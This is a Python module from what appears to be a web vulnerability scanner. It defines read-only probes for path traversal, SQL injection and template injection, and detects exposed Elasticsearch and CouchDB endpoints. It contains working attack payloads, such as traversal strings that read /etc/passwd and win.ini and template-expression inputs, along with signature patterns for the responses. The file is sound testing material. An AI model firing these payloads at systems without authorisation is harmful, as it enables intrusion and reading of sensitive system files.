"""Injection probe families: strict class signatures with benign differential controls.

Each family confirms only when a payload elicits a signature that the benign control
value does not. All probes are read-only HTTP GETs; none mutate target state.
"""

from __future__ import annotations

import json
import re

# Path traversal / LFI: /etc/passwd account line or Windows .ini section headers.
TRAVERSAL_SIGNATURE = re.compile(r"root:[^\n:]*:0:0:|\[(?:fonts|extensions|mci extensions)\]", re.IGNORECASE)
TRAVERSAL_PAYLOADS = (
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
)

# Error-based SQL injection: database engine error strings that a valid value never yields.
SQL_ERROR_SIGNATURE = re.compile(
    r"SQL syntax|SQLite3?::|sqlite3\.(?:OperationalError|Warning)|OperationalError:|"
    r"unrecognized token|psycopg2|PG::\w*Error|ORA-\d{5}|mysql_fetch|mysqli?_\w+\(\)|"
    r"You have an error in your SQL|Unclosed quotation mark|quoted string not properly terminated|"
    r"SQLSTATE\[|Microsoft OLE DB Provider|ODBC SQL Server Driver|Npgsql\.",
    re.IGNORECASE,
)

# Server-side template injection: a product unlikely to occur unless the engine evaluates it.
SSTI_A, SSTI_B = 191, 181
SSTI_PRODUCT = str(SSTI_A * SSTI_B)  # 34571
SSTI_PAYLOADS = (
    f"{{{{{SSTI_A}*{SSTI_B}}}}}",
    f"${{{SSTI_A}*{SSTI_B}}}",
    f"#{{{SSTI_A}*{SSTI_B}}}",
    f"<%= {SSTI_A}*{SSTI_B} %>",
)


def traversal_hit(text: str) -> bool:
    return bool(TRAVERSAL_SIGNATURE.search(text))


def sql_error_hit(text: str) -> bool:
    return bool(SQL_ERROR_SIGNATURE.search(text))


def ssti_hit(text: str) -> bool:
    return SSTI_PRODUCT in text


BODY_FAMILIES = {
    "web.path_traversal": (TRAVERSAL_PAYLOADS, traversal_hit),
    "web.sql_injection": (None, sql_error_hit),  # payload derives from the benign marker (marker + "'")
    "web.ssti": (SSTI_PAYLOADS, ssti_hit),
}


def datastore_signature(url: str, text: str) -> str | None:
    """Identify an unauthenticated Elasticsearch/CouchDB management document, else None."""
    try:
        document = json.loads(text)
    except (ValueError, TypeError):
        return None
    if isinstance(document, dict):
        if {"cluster_name", "status", "number_of_nodes"} <= document.keys():
            return "elasticsearch_cluster_health"
        if document.get("tagline") == "You Know, for Search":
            return "elasticsearch_root"
        if document.get("couchdb") == "Welcome":
            return "couchdb_welcome"
    if isinstance(document, list) and url.split("?", 1)[0].rstrip("/").endswith("_all_dbs"):
        return "couchdb_all_dbs" if document and all(isinstance(x, str) for x in document) else None
    return None
